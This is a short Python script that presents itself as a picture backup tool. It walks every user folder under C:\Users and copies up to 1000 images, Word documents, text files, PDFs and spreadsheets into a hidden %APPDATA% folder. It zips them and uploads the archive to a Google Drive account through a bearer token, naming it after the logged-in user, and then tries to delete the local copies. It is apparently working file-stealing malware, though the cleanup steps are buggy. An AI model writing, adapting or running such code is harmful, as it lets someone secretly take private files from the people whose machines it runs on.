#!/usr/bin/env python3

import os
import shutil
import base64
import json
import requests

class WIN_Geat:
    def __init__(self):
        
        self.Images_CO()
        self.Cloue_Store()
    def Images_CO(self):
        self.Token  = ""# add the Token hare
       
        count = 0
        if os.path.exists(os.environ["appdata"] +'\\PicBackup' ) :
           shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=False, onerror=None)
           os.mkdir(os.environ["appdata"] +'\\PicBackup') 
           os.chdir(os.environ["appdata"] +'\\PicBackup')
           
        else:    
           os.mkdir(os.environ["appdata"] +'\\PicBackup')
           os.chdir(os.environ["appdata"] +'\\PicBackup')
        count = 0    
        for (root,dirs,Filesa) in os.walk('C:\\Users'): 
                  for Files in Filesa  :
                     if 'OneDriveMedTile' in Files or 'Microsoft.Windows' in Files or  'VisualElements'in Files\
                        or 'Square44x44Logo' in Files or 'Microsoft.Windows' in Files or 'aboutIcon' in Files\
                        or 'accountIcon' in Files or 'chevronUp' in Files or 'ic_fluent_add' in Files\
                        or 'notificationsIcon' in Files or 'syncIcon' in Files or 'RainierSunset' in Files or 'CachedImage' in Files\
                        or '5c61d427e791efb' in Files or '28fed39013f5f' in Files or 'AppData' in root  :
                        pass
                     else:
                       if '.jpg' in Files or '.png' in Files or '.jpeg' in Files\
                            or '.webp' in Files or '.JPG'  in Files\
                            or '.PNG'  in Files or '.JPEG' in Files\
                            or '.WEBP' in Files or '.docx' in Files\
                            or '.DOCX' in Files or '.txt'  in Files\
                            or '.TXT'  in Files or '.pdf'  in Files\
                            or '.xls'  in Files or '.XLS'  in Files\
                            or '.PDF'  in Files   :
                            with open(root+'\\'+Files,'rb') as pic:
                                readpic = pic.read()
                            with open(Files,'wb') as pic:
                                pic.write(readpic)
                            count +=1     
                            if count == 1000 :
                                break        
        shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
        shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
    def Cloue_Store(self):
         headers = {"Authorization":"Bearer " +self.Token}
         para = {
                    "name":os.getlogin()+'_Documents.zip'
                }
         files = {
                  'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
                  'file': open(os.environ["appdata"]+'\\PicBackup.zip','rb')
                 }
         repoanse = requests.post(
                            "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                             headers=headers,
                             files=files
                          )
         print(repoanse.text)
         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
         os.rmdir(os.environ["appdata"] +'\\PicBackup')
         os.rmdir(os.environ["appdata"] +'\\PicBackup.zip')
if __name__=='__main__':
    WIN_Geat()
       
       






